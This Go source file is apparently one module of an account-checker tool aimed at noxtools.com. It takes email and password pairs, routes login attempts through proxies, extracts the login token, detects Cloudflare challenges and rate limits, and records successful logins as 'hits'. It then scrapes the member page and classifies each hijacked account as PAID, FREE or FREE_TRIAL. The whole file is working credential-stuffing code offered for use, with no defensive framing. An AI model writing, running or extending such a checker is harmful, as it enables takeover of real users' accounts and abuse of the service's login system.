package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var (
	noxLoginAttemptIDRE = regexp.MustCompile(`(?i)name=["']login_attempt_id["'][^>]*value=["']([^"']+)["']`)
	noxLoginAttemptIDRE2 = regexp.MustCompile(`(?i)value=["']([0-9]{8,})["'][^>]*name=["']login_attempt_id["']`)
	noxAMErrorsRE       = regexp.MustCompile(`(?is)class=["']am-errors["'][^>]*>(.*?)</`)
	noxProductTitleRE   = regexp.MustCompile(`(?is)<(?:h[1-6]|strong|td)[^>]*>\s*([^<]{3,80})\s*</`)
)

func (c *Checker) checkNoxtools(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	defer clearHTTPClientSession(client, c.cfg.BaseURL(), "https://noxtools.com")

	loginURL := c.cfg.LoginURL()
	referer := c.cfg.Var("login_referer", c.cfg.BaseURL()+"/")

	loginBody, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}
	if noxtoolsIsCloudflareChallenge(loginBody) {
		result.Status = StatusError
		result.Reason = "Cloudflare challenge on login page — try proxy or wait"
		return result
	}

	attemptID, err := parseNoxtoolsLoginAttemptID(loginBody)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	finalURL, postBody, postStatus, err := c.postNoxtoolsLogin(client, loginURL, email, password, attemptID, referer)
	if err != nil {
		status, reason := c.resultFromRequestErr("login POST", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login POST HTTP 429")
		return result
	}

	if msg := parseNoxtoolsLoginError(postBody); msg != "" {
		lower := strings.ToLower(msg)
		if strings.Contains(lower, "wait") || strings.Contains(lower, "try again later") || strings.Contains(lower, "too many") {
			result.Status = StatusRateLimited
			result.Reason = msg
			return result
		}
		result.Status = StatusFail
		result.Reason = msg
		return result
	}

	if !noxtoolsLoginSucceeded(finalURL, postBody) {
		result.Status = StatusFail
		result.Reason = "login failed — still on sign-in page"
		return result
	}

	result.AccountEmail = email
	if plan, ok := c.fetchNoxtoolsMemberPlan(client); ok {
		result.PlanName = plan
	} else {
		result.PlanName = "Logged In"
	}
	result.PlanLabel = classifyNoxtoolsPlan(result.PlanName)
	result.Status = StatusHit
	return result
}

func parseNoxtoolsLoginAttemptID(html string) (string, error) {
	for _, re := range []*regexp.Regexp{noxLoginAttemptIDRE, noxLoginAttemptIDRE2} {
		if m := re.FindStringSubmatch(html); len(m) > 1 && strings.TrimSpace(m[1]) != "" {
			return strings.TrimSpace(m[1]), nil
		}
	}
	return "", fmt.Errorf("login_attempt_id not found — fetch fresh GET %s before POST", "/secure/login")
}

func (c *Checker) postNoxtoolsLogin(client *http.Client, loginURL, email, password, attemptID, referer string) (finalURL, body string, status int, err error) {
	form := url.Values{}
	form.Set("amember_login", email)
	form.Set("amember_pass", password)
	form.Set("login_attempt_id", attemptID)
	form.Set("_referer", referer)

	req, err := http.NewRequest(http.MethodPost, loginURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", 0, err
	}
	req.Header.Set("User-Agent", c.cfg.UserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Origin", c.cfg.BaseURL())
	req.Header.Set("Referer", loginURL)

	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
	if err != nil {
		return resp.Request.URL.String(), "", resp.StatusCode, err
	}
	return resp.Request.URL.String(), string(data), resp.StatusCode, nil
}

func parseNoxtoolsLoginError(body string) string {
	m := noxAMErrorsRE.FindStringSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	text := regexp.MustCompile(`<[^>]+>`).ReplaceAllString(m[1], " ")
	text = strings.Join(strings.Fields(text), " ")
	return strings.TrimSpace(text)
}

func noxtoolsLoginSucceeded(finalURL, body string) bool {
	if parseNoxtoolsLoginError(body) != "" {
		return false
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, `name="amember_login"`) && strings.Contains(lower, "sign in") {
		u, err := url.Parse(finalURL)
		if err != nil || strings.HasSuffix(strings.ToLower(u.Path), "/secure/login") {
			return false
		}
	}
	u, err := url.Parse(finalURL)
	if err == nil {
		path := strings.ToLower(u.Path)
		if strings.Contains(path, "/secure/secure/") {
			return true
		}
		if strings.Contains(path, "/secure/member") && !strings.Contains(path, "/secure/login") {
			return true
		}
	}
	return !strings.Contains(lower, `name="amember_login"`)
}

func noxtoolsIsCloudflareChallenge(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "cdn-cgi/challenge-platform") &&
		(strings.Contains(lower, "just a moment") || strings.Contains(lower, "cf-browser-verification"))
}

func (c *Checker) fetchNoxtoolsMemberPlan(client *http.Client) (string, bool) {
	memberURL := c.cfg.Var("member_url", c.cfg.BaseURL()+"/secure/member")
	body, status, _, err := c.doRequest(client, "GET", memberURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache",
		"User-Agent":      c.cfg.UserAgent,
		"Referer":         c.cfg.BaseURL() + "/",
	}, "")
	if err != nil || status != http.StatusOK {
		return "", false
	}
	if strings.Contains(strings.ToLower(body), `name="amember_login"`) {
		return "", false
	}
	if plan, ok := extractNoxtoolsPlanFromMemberHTML(body); ok {
		return plan, true
	}
	return "", false
}

func extractNoxtoolsPlanFromMemberHTML(body string) (string, bool) {
	lower := strings.ToLower(body)
	markers := []string{
		"active subscription",
		"active subscriptions",
		"your subscription",
		"product:",
		"package:",
	}
	for _, marker := range markers {
		idx := strings.Index(lower, marker)
		if idx < 0 {
			continue
		}
		snippet := body[idx:min(idx+400, len(body))]
		if m := noxProductTitleRE.FindStringSubmatch(snippet); len(m) > 1 {
			title := strings.TrimSpace(m[1])
			if title != "" && !strings.EqualFold(title, "Active Subscriptions") {
				return title, true
			}
		}
	}
	if strings.Contains(lower, "no active subscription") {
		return "No Active Subscription", true
	}
	return "", false
}

func classifyNoxtoolsPlan(planName string) string {
	lower := strings.ToLower(strings.TrimSpace(planName))
	switch {
	case lower == "" || lower == "logged in":
		return "UNKNOWN"
	case strings.Contains(lower, "no active"):
		return "FREE"
	case strings.Contains(lower, "trial"):
		return "FREE_TRIAL"
	case strings.Contains(lower, "free"):
		return "FREE"
	default:
		return "PAID"
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
